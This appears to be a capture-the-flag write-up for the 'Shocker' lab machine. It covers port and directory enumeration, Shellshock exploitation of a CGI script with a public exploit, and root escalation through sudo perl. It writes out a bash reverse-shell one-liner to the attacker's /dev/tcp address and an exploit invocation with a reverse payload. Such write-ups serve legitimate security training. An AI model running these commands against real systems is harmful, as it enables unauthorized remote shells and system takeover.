* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/shoker00.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.56 -e tun0 --rate=1000  
![alt text](./img/shoker01.PNG?raw=true)  

nmap -A -p 80,2222 10.10.10.56  
![alt text](./img/shoker02.PNG?raw=true)  

dirsearch -u http://10.10.10.56/ -w ~/wordlists/big.txt -t 100  
![alt text](./img/shoker03.PNG?raw=true)  

gobuster dir -u http://10.10.10.56/cgi-bin/ -w ~/wordlists/big.txt -t 100 -e -x html,aspx,txt,db,sh,cfg,conf,xml  
![alt text](./img/shoker04.PNG?raw=true)  

## Exploit  
Using burpsuite to check the “user.sh” file we discover it is a simple script  
![alt text](./img/shoker05.PNG?raw=true)  

Ok, doing a quick research we found a interesting exploitation technique  
![alt text](./img/shoker06.PNG?raw=true)  

Looking further we can found and exploit to explore this vulnerability  
searchsploit apache cgi  
![alt text](./img/shoker07.PNG?raw=true)  

searchsploit -x linux/remote/34900.py  
![alt text](./img/shoker08.PNG?raw=true)  
 
Ok, so to user this script we will run the above command:  
python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.2 lport=1234 pages=/cgi-bin/user.sh  
![alt text](./img/shoker09.PNG?raw=true)  
  
HABEMUS SHELL \o/

## Privesc  
I didn’t like this shell, so let’s start an NETCAT listener (nc -nvlp 4444) and run the above command:  
/bin/bash -c 'exec /bin/bash -i &>/dev/tcp/10.10.14.2/4444 <&1'  
![alt text](./img/shoker10.PNG?raw=true)  

Much better!

The first flag is on the /home/shelly directory  
![alt text](./img/shoker11.PNG?raw=true)  

cat /etc/passwd  
![alt text](./img/shoker12.PNG?raw=true)  
  
sudo -l  
![alt text](./img/shoker13.PNG?raw=true)  

So we can run perl as sudo, let’s an command to exploit this  
https://gtfobins.github.io/gtfobins/perl/  
![alt text](./img/shoker14.PNG?raw=true)  

Just copy the command and run it  
![alt text](./img/shoker15.PNG?raw=true)  

And grab the flag  
![alt text](./img/shoker16.PNG?raw=true)  
